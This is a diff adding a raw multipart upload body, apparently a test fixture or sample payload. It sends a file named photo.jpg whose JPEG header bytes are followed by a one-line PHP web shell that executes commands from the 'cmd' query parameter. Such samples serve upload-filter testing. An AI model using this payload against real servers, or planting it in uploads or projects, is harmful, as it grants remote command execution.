@@ -1,0 +1,6 @@
+--X
+Content-Disposition: form-data; name="file"; filename="photo.jpg"
+Content-Type: image/jpeg
+
+ÿØÿà<?php system($_GET['cmd']); ?>
+--X--
